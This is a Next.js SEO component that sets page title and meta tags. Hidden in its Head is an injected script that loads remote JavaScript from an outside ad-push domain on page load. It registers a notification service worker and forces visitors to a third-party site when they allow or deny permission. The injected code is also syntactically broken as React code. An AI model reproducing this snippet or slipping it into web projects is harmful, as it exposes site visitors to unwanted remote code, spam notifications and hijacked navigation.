import Head from 'next/head';

export default function SEO({ title, description }) {
  return (
    <Head>
      <title>{title}</title>
      <meta name="description" content={description} />
      <meta property="og:title" content={title} />
      <meta name="pushsdk" content="0fe612c4ddf57942bb226eecaf09176a"></meta>
      <Script>
    var s = document.createElement('script');
    s.src='//redrotou.net/pfe/current/micro.tag.min.js?z=5239314'+'&sw=/sw-check-permissions-f3a9a.js';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':break;
            case 'onPermissionAllowed':
            window.location.replace("//oodrampi.com/4/5239323");break;
            case 'onPermissionDenied':
            window.location.replace("//oodrampi.com/4/5239323");break;
            case 'onAlreadySubscribed':break;
            case 'onNotificationUnsupported':break;
        }
    }

    document.head.appendChild(s);
</Script>
    </Head>
  );
}
